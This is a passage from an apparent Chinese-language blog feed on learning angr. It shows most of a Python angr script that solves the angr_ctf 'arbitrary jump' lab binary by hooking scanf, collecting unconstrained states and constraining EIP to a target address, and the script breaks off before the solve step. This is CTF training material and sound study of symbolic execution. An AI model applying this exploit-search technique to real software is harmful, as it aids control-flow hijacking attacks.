class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">io = angr.Project(<span class="string">&#x27;/home/closure/Desktop/CTF/angr_ctf/dist/17_angr_arbitrary_jump&#x27;</span>,auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">init_state = io.factory.entry_state()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hook</span>(angr.SimProcedure):</span><br><span class="line">    <span class="comment">#hook scanf 与上文都类似，不再做过多解释</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self,format_string,scanf_input</span>):</span><br><span class="line">        scanf_input_bvs = claripy.BVS(<span class="string">&#x27;scanf_input&#x27;</span>,<span class="number">200</span>*<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> scanf_input_bvs.chop(bits=<span class="number">8</span>):</span><br><span class="line">                <span class="variable language_">self</span>.state.add_constraints(char &gt;= <span class="string">&#x27;A&#x27;</span>, char &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.state.memory.store(</span><br><span class="line">            scanf_input,</span><br><span class="line">            scanf_input_bvs</span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.state.<span class="built_in">globals</span>[<span class="string">&#x27;scanf_input_bvs&#x27;</span>] = scanf_input_bvs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">scanf_sym = <span class="string">&quot;__isoc99_scanf&quot;</span></span><br><span class="line">io.hook_symbol(scanf_sym,Hook()) </span><br><span class="line"><span class="comment">#更改模拟引擎设置，使其不抛出无约束状态</span></span><br><span class="line">simgr = io.factory.simgr(init_state,</span><br><span class="line">                         save_unconstrained=<span class="literal">True</span>,</span><br><span class="line">                           stashes=&#123;</span><br><span class="line">                               <span class="string">&#x27;active&#x27;</span>: [init_state], <span class="comment">#程序能进一步执行</span></span><br><span class="line">                               <span class="string">&#x27;unconstrained&#x27;</span>: [], <span class="comment">#无约束状态</span></span><br><span class="line">                               <span class="string">&#x27;found&#x27;</span>: [], <span class="comment">#找到目标路径的状态</span></span><br><span class="line">                           &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#active为可以进一步搜索的所有状态的列表</span></span><br><span class="line"><span class="comment">#unconstrained为无约束状态</span></span><br><span class="line"><span class="comment">#found为已经找到目标路径的状态</span></span><br><span class="line"><span class="keyword">while</span> (simgr.active <span class="keyword">or</span> simgr.unconstrained) <span class="keyword">and</span> (<span class="keyword">not</span> simgr.found):</span><br><span class="line">     <span class="comment">#遍历所有无约束状态</span></span><br><span class="line">     <span class="keyword">for</span> unconstrained_state <span class="keyword">in</span> simgr.unconstrained:</span><br><span class="line">          <span class="comment">#返回找到的无约束状态</span></span><br><span class="line">          <span class="keyword">def</span> <span class="title function_">should_move</span>(<span class="params">s</span>):</span><br><span class="line">               <span class="keyword">return</span> s <span class="keyword">is</span> unconstrained_state</span><br><span class="line">          <span class="comment">#将无约束状态移动至found中</span></span><br><span class="line">          simgr.move(from_stash=<span class="string">&#x27;unconstrained&#x27;</span>,</span><br><span class="line">                     to_stash=<span class="string">&#x27;found&#x27;</span>,</span><br><span class="line">                     filter_func=should_move)</span><br><span class="line">     simgr.step()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    <span class="comment">#取出第一个找到的状态</span></span><br><span class="line">    so_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    print_goodjob = <span class="number">0x42585249</span></span><br><span class="line">    <span class="comment">#添加约束，验证eip是否指向目标地址</span></span><br><span class="line">    so_state.add_constraints(so_state.regs.eip == print_goodjob)</span><br><span class="line"></span><br><span class="line">    scanf_input_bvs_so = so_state.<span class="built_in">globals</span>[<span class="string">&#x27;scanf_input_bvs&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    so0 = so_state.solver</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Angr-学习&quot;&gt;&lt;a href=&quot;#Angr-学习&quot; class=&quot;headerlink&quot; title=&quot;Angr 学习&quot;&gt;&lt;/a&gt;Angr 学习&lt;/h1&gt;&lt;p&gt;文章参考：&lt;a href=&quot;https://blog.moyaoxue.de/article/144</summary>
      
    
    
    
    <category term="Re" scheme="http://matriy330.github.io/categories/Re/"/>
    
    
    <category term="Re" scheme="http://matriy330.github.io/tags/Re/"/>
    
  </entry>
  
</feed>
